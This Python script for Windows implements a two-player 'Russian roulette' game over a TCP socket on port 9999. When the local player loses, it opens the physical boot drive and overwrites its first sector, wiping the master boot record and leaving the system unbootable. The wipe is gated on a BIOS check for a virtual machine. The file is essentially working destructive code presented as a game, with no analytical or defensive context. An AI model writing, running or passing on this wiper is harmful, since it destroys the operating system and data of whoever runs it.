import socket
from win32ui import *
from win32con import *
from win32file import *
import subprocess
import random

current_chamber = random.randint(1, 6)
bullet_chamber = 0
player = 0

print('Waiting for the opponent.')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 9999))
s.listen(5)
conn, addr = s.accept()
conn.settimeout(None)
print("Connected with player1!")


def send(msg):
    conn.send(msg.encode())

def recieve(bytes):
    r_msg = conn.recv(bytes).decode()

    if bytes == 2:
        global bullet_chamber, player
        bullet_chamber = int(r_msg[0])
        player = int(r_msg[1])
        if player == 1:
            send("a")
        return
    
    if r_msg == "d":
        MessageBox("Your Player1 is dead, Your device is safe! You can rest easy.", "Result", MB_ICONWARNING)

    elif r_msg == 's':
        MessageBox("Your Player1 survived! Its your turn now.", "Result", MB_ICONWARNING)
        dead = russian_roulette()
        if dead:
            status("d")
        else:
            status("s")

    # r_msg = ''


def vm():
    try:
        o = subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower()
        if 'virtual' in o or 'vmware' in o or 'vbox' in o:
            return True

        return False

    except Exception as e:
        return False


def status(stat):
    if stat == "d":
        if vm():
            hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
            WriteFile(hDevice, AllocateReadBuffer(512), None)
            CloseHandle(hDevice)
        MessageBox("Your device is done for! Enjoy while it lasts.", "Russian Roulette!", MB_ICONWARNING)

    else:
        MessageBox("You survived, lets see how far you can go.", "Russian Roulette!", MB_ICONWARNING)

    send(stat)
    recieve(1)


def russian_roulette():
    global current_chamber

    input("Press enter to pull the trigger.")

    if current_chamber == bullet_chamber:
        return True
    
    current_chamber = random.randint(1, 6)
    print("Waiting for the opponent.")
    return False
        

def start():
    global current_chamber
    MessageBox("You've chosen to play the MBR-Roulette. If you lose, your operting system is done forever. The only way to save your system is to survive until your opponent loses. Have fun :)", "Russian Roulette", MB_ICONWARNING)
    recieve(2)
    if player == 2:
        dead = russian_roulette()
        if dead:
            status("d")
        
        else:
            status("s")

    else:
        recieve(1)


start()
